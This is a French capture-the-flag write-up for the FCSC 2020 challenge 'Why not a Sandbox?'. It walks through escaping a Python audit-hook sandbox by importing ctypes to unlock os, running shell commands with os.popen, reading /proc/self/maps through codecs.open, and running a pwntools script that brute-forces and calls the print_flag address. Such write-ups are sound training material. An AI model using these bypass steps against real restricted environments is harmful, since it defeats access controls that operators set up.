---
layout: post
title:  "Why not a Sandbox?"
date:   2020-05-04 10:06:07 +0200
categories: writeup
---

# FCSC

## Pwn

### Why not a Sandbox?

Ce challenge est composé d'un service permettant de lancer un shell python sur une machine distante.
Une fois lancé on nous souhaite la bienvenue avec ce message

```
Arriverez-vous à appeler la fonction print_flag ?
```

Le but de ce challenge est donc d'afficher le flag en appelant la fonction `print_flag`, pourtant.

```python
>>> print_flag
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'print_flag' is not defined
```


-------

#### Pyjail or Not ?

Un shell python ? On peut penser que le challenge en question est un pyjail.
On test alors un certain nombre de commande qui pourrait être la solution sur un pyjail.

```python
>>> import os
Exception ignored in audit hook:
Exception: Action interdite
Exception: Module non autorisé
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': ...}
>>> dir()
['__annotations__', '__builtins__', '__doc__', '__loader__', ...]
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', ...]
>> etc...
```

Après nombre de tentatives infructeuse on se rend compte que ce n'est surement pas ce qu'il faut faire.

-------

#### Énumération

Le but étant d'appeler `print_flag` on se rend compte que sans doute la fonction est load dans notre programme et c'est à nous de trouver un pointeur dessus.
Mais comment faire ça en python ? Avec un peu de recherche on trouve la lib `ctypes` qui nous permet entre autre de créer des pointeurs sur fonction.

On cherche donc à avoir un code comme cela:
```python
>>> import ctypes
>>>
>>> f = ctypes.CFUNCTYPE(ctypes.c_void_p)
>>> d = f(addr_print_flag)
>>> d()
FCSC{......}
```

Après quelques test on arrive à importer `os`, étant bien sur surpris nous remarquons que `os` est importable une fois `ctypes` et `sys` importés.
Grâce à `os` nous pouvons utiliser `popen` pour lancer un certain nombre de commande
```python
>>> import ctypes
>>> import sys
>>> import os

>>> print(os.popen('ls').read())
lib_flag.so
spython

>>> print(os.popen('ldd spython').read())
	linux-vdso.so.1 (0x00007ffd7510e000)
	libpython3.8.so.1.0 => /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0 (0x00007fe6f30b3000)
	lib_flag.so => not found
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe6f2ef0000)
	libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007fe6f2ec3000)
	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fe6f2ca9000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe6f2c88000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe6f2c81000)
	libutil.so.1 => /lib/x86_64-linux-gnu/libutil.so.1 (0x00007fe6f2c7c000)
	libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007fe6f2b37000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fe6f360a000)

>>>
```

On remarque cette lib_flag.so et le faite qu'elle soit link avec notre programme, on essaye donc de lire `/proc/self/maps` afin de trouver son addresse de base.

```python
>>> open('/proc/self/maps')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
```

Hum... ce n'est pas possible comme ça il faut trouver un autre moyen de lire le fichire, cette fois encore un peu de recherche nous montre la lib `codecs` et plus précisement sa fonction `open`.

```python
>>> import codecs
>>>
>>> print(codecs.open('/proc/self/maps').read())
56513c900000-56513c901000 r--p 00000000 09:03 16515517                   /app/spython
56513c901000-56513c902000 r-xp 00001000 09:03 16515517                   /app/spython
56513c902000-56513c903000 r--p 00002000 09:03 16515517                   /app/spython
56513c903000-56513c904000 r--p 00002000 09:03 16515517                   /app/spython
56513c904000-56513c905000 rw-p 00003000 09:03 16515517                   /app/spython
56513e4b5000-56513e5fc000 rw-p 00000000 00:00 0                          [heap]
7f49f3c94000-7f49f3cd4000 rw-p 00000000 00:00 0
7f49f3d54000-7f49f3d94000 rw-p 00000000 00:00 0
7f49f3e14000-7f49f3e54000 rw-p 00000000 00:00 0
7f49f3e54000-7f49f3e56000 r--p 00000000 09:03 16386006                   /usr/lib/x86_64-linux-g
nu/libffi.so.7.1.0
7f49f3e56000-7f49f3e5c000 r-xp 00002000 09:03 16386006                   /usr/lib/x86_64-linux-g
nu/libffi.so.7.1.0
7f49f3e5c000-7f49f3e5d000 r--p 00008000 09:03 16386006                   /usr/lib/x86_64-linux-g
nu/libffi.so.7.1.0
7f49f3e5d000-7f49f3e5e000 ---p 00009000 09:03 16386006                   /usr/lib/x86_64-linux-g
nu/libffi.so.7.1.0
7f49f3e5e000-7f49f3e5f000 r--p 00009000 09:03 16386006                   /usr/lib/x86_64-linux-g
nu/libffi.so.7.1.0
7f49f3e5f000-7f49f3e60000 rw-p 0000a000 09:03 16386006                   /usr/lib/x86_64-linux-g
nu/libffi.so.7.1.0
7f49f3e60000-7f49f3e67000 r--p 00000000 09:03 16385479                   /usr/lib/python3.8/lib-
dynload/_ctypes.cpython-38-x86_64-linux-gnu.so
7f49f3e67000-7f49f3e76000 r-xp 00007000 09:03 16385479                   /usr/lib/python3.8/lib-
dynload/_ctypes.cpython-38-x86_64-linux-gnu.so
7f49f3e76000-7f49f3e7c000 r--p 00016000 09:03 16385479                   /usr/lib/python3.8/lib-
dynload/_ctypes.cpython-38-x86_64-linux-gnu.so
7f49f3e7c000-7f49f3e7d000 ---p 0001c000 09:03 16385479                   /usr/lib/python3.8/lib-
dynload/_ctypes.cpython-38-x86_64-linux-gnu.so
7f49f3e7d000-7f49f3e7e000 r--p 0001c000 09:03 16385479                   /usr/lib/python3.8/lib-
dynload/_ctypes.cpython-38-x86_64-linux-gnu.so
7f49f3e7e000-7f49f3e82000 rw-p 0001d000 09:03 16385479                   /usr/lib/python3.8/lib-
dynload/_ctypes.cpython-38-x86_64-linux-gnu.so
7f49f3e82000-7f49f4167000 rw-p 00000000 00:00 0
7f49f4167000-7f49f416e000 r--s 00000000 09:03 16385993                   /usr/lib/x86_64-linux-g
nu/gconv/gconv-modules.cache
7f49f416e000-7f49f41a0000 r--p 00000000 09:03 16385128                   /usr/lib/locale/C.UTF-8
/LC_CTYPE
7f49f41a0000-7f49f41a2000 rw-p 00000000 00:00 0
7f49f41a2000-7f49f41b1000 r--p 00000000 09:03 16385026                   /lib/x86_64-linux-gnu/l
ibm-2.30.so
7f49f41b1000-7f49f424c000 r-xp 0000f000 09:03 16385026                   /lib/x86_64-linux-gnu/l
ibm-2.30.so
7f49f424c000-7f49f42e5000 r--p 000aa000 09:03 16385026                   /lib/x86_64-linux-gnu/l
ibm-2.30.so
7f49f42e5000-7f49f42e6000 r--p 00142000 09:03 16385026                   /lib/x86_64-linux-gnu/l
ibm-2.30.so
7f49f42e6000-7f49f42e7000 rw-p 00143000 09:03 16385026                   /lib/x86_64-linux-gnu/l
ibm-2.30.so
7f49f42e7000-7f49f42e8000 r--p 00000000 09:03 16385072                   /lib/x86_64-linux-gnu/l
ibutil-2.30.so
7f49f42e8000-7f49f42e9000 r-xp 00001000 09:03 16385072                   /lib/x86_64-linux-gnu/l
ibutil-2.30.so
7f49f42e9000-7f49f42ea000 r--p 00002000 09:03 16385072                   /lib/x86_64-linux-gnu/l
ibutil-2.30.so
7f49f42ea000-7f49f42eb000 r--p 00002000 09:03 16385072                   /lib/x86_64-linux-gnu/l
ibutil-2.30.so
7f49f42eb000-7f49f42ec000 rw-p 00003000 09:03 16385072                   /lib/x86_64-linux-gnu/l
ibutil-2.30.so
7f49f42ec000-7f49f42ed000 r--p 00000000 09:03 16385016                   /lib/x86_64-linux-gnu/l
ibdl-2.30.so
7f49f42ed000-7f49f42ee000 r-xp 00001000 09:03 16385016                   /lib/x86_64-linux-gnu/l
ibdl-2.30.so
7f49f42ee000-7f49f42ef000 r--p 00002000 09:03 16385016                   /lib/x86_64-linux-gnu/l
ibdl-2.30.so
7f49f42ef000-7f49f42f0000 r--p 00002000 09:03 16385016                   /lib/x86_64-linux-gnu/l
ibdl-2.30.so
7f49f42f0000-7f49f42f1000 rw-p 00003000 09:03 16385016                   /lib/x86_64-linux-gnu/l
ibdl-2.30.so
7f49f42f1000-7f49f42f3000 rw-p 00000000 00:00 0
7f49f42f3000-7f49f42fa000 r--p 00000000 09:03 16385057                   /lib/x86_64-linux-gnu/l
ibpthread-2.30.so
7f49f42fa000-7f49f4309000 r-xp 00007000 09:03 16385057                   /lib/x86_64-linux-gnu/l
ibpthread-2.30.so
7f49f4309000-7f49f430e000 r--p 00016000 09:03 16385057                   /lib/x86_64-linux-gnu/l
ibpthread-2.30.so
7f49f430e000-7f49f430f000 r--p 0001a000 09:03 16385057                   /lib/x86_64-linux-gnu/l
ibpthread-2.30.so
7f49f430f000-7f49f4310000 rw-p 0001b000 09:03 16385057                   /lib/x86_64-linux-gnu/l
ibpthread-2.30.so
7f49f4310000-7f49f4314000 rw-p 00000000 00:00 0
7f49f4314000-7f49f432d000 r-xp 00000000 09:03 3277621                    /lib/x86_64-linux-gnu/l
ibz.so.1.2.8
7f49f432d000-7f49f452c000 ---p 00019000 09:03 3277621                    /lib/x86_64-linux-gnu/l
ibz.so.1.2.8
7f49f452c000-7f49f452d000 r--p 00018000 09:03 3277621                    /lib/x86_64-linux-gnu/l
ibz.so.1.2.8
7f49f452d000-7f49f452e000 rw-p 00019000 09:03 3277621                    /lib/x86_64-linux-gnu/l
ibz.so.1.2.8
7f49f452e000-7f49f4532000 r--p 00000000 09:03 16385021                   /lib/x86_64-linux-gnu/l
ibexpat.so.1.6.11
7f49f4532000-7f49f454d000 r-xp 00004000 09:03 16385021                   /lib/x86_64-linux-gnu/l
ibexpat.so.1.6.11
7f49f454d000-7f49f4557000 r--p 0001f000 09:03 16385021                   /lib/x86_64-linux-gnu/l
ibexpat.so.1.6.11
7f49f4557000-7f49f4558000 ---p 00029000 09:03 16385021                   /lib/x86_64-linux-gnu/l
ibexpat.so.1.6.11
7f49f4558000-7f49f455a000 r--p 00029000 09:03 16385021                   /lib/x86_64-linux-gnu/l
ibexpat.so.1.6.11
7f49f455a000-7f49f455b000 rw-p 0002b000 09:03 16385021                   /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f49f455b000-7f49f4580000 r--p 00000000 09:03 16385009                   /lib/x86_64-linux-gnu/libc-2.30.so
7f49f4580000-7f49f46ca000 r-xp 00025000 09:03 16385009                   /lib/x86_64-linux-gnu/libc-2.30.so
7f49f46ca000-7f49f4714000 r--p 0016f000 09:03 16385009                   /lib/x86_64-linux-gnu/libc-2.30.so
7f49f4714000-7f49f4717000 r--p 001b8000 09:03 16385009                   /lib/x86_64-linux-gnu/libc-2.30.so
7f49f4717000-7f49f471a000 rw-p 001bb000 09:03 16385009                   /lib/x86_64-linux-gnu/libc-2.30.so
7f49f471a000-7f49f471e000 rw-p 00000000 00:00 0
7f49f471e000-7f49f471f000 r--p 00000000 09:03 16515501                   /app/lib_flag.so
7f49f471f000-7f49f4720000 r-xp 00001000 09:03 16515501                   /app/lib_flag.so
7f49f4720000-7f49f4721000 r--p 00002000 09:03 16515501                   /app/lib_flag.so
7f49f4721000-7f49f4722000 r--p 00002000 09:03 16515501                   /app/lib_flag.so
7f49f4722000-7f49f4723000 rw-p 00003000 09:03 16515501                   /app/lib_flag.so
7f49f4723000-7f49f4794000 r--p 00000000 09:03 16386021                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f49f4794000-7f49f49e8000 r-xp 00071000 09:03 16386021                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f49f49e8000-7f49f4c01000 r--p 002c5000 09:03 16386021                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f49f4c01000-7f49f4c07000 r--p 004dd000 09:03 16386021                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f49f4c07000-7f49f4c4e000 rw-p 004e3000 09:03 16386021                   /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f49f4c4e000-7f49f4c73000 rw-p 00000000 00:00 0
7f49f4c75000-7f49f4c76000 r--p 00000000 09:03 16384996                   /lib/x86_64-linux-gnu/ld-2.30.so
7f49f4c76000-7f49f4c94000 r-xp 00001000 09:03 16384996                   /lib/x86_64-linux-gnu/ld-2.30.so
7f49f4c94000-7f49f4c9c000 r--p 0001f000 09:03 16384996                   /lib/x86_64-linux-gnu/ld-2.30.so
7f49f4c9d000-7f49f4c9e000 r--p 00027000 09:03 16384996                   /lib/x86_64-linux-gnu/ld-2.30.so
7f49f4c9e000-7f49f4c9f000 rw-p 00028000 09:03 16384996                   /lib/x86_64-linux-gnu/ld-2.30.so
7f49f4c9f000-7f49f4ca0000 rw-p 00000000 00:00 0
7ffe9820d000-7ffe9822e000 rw-p 00000000 00:00 0                          [stack]
7ffe983da000-7ffe983dd000 r--p 00000000 00:00 0                          [vvar]
7ffe983dd000-7ffe983df000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

-------

#### Exploitation

Bingo `7f49f471f000-7f49f4720000 r-xp 00001000 09:03 16515501 /app/lib_flag.so`, on a son addresse.
Il nous reste juste à faire un script qui brutforce dans le range constant de `0x1000` l'addresse de `print_flag` par rapport à l'addresse de base de `lib_flag`.

```python
from pwn import remote

def send_command(cmd):
    r.readuntil(b'>>> ')
    r.sendline(cmd)
    pass

for i in range(4096):
    r = remote('challenges1.france-cybersecurity-challenge.fr', 4005)


    send_command('import ctypes')
    send_command('import sys')
    send_command('import codecs')

    send_command('f = ctypes.CFUNCTYPE(ctypes.c_void_p)')
    send_command("codecs.open('/proc/self/maps').read()")

    maps = r.readuntil(b'\\n\'')[1:-3].split(b'\\n')
    idx = [i for i, n in enumerate(maps) if b'r-xp' in n][10]
    base_addr = int(maps[idx][:12], 16)

    print("[+] base_addr:", hex(base_addr))

    send_command("d = f(0x%x)" % (base_addr + i))
    send_command("d()")
    try:
        res = r.readline(timeout=1)
        if b'FCSC' in res:
            print(res)
            break
    except EOFError:
        pass
    r.close()
```

On lance le script et on recupère le flag.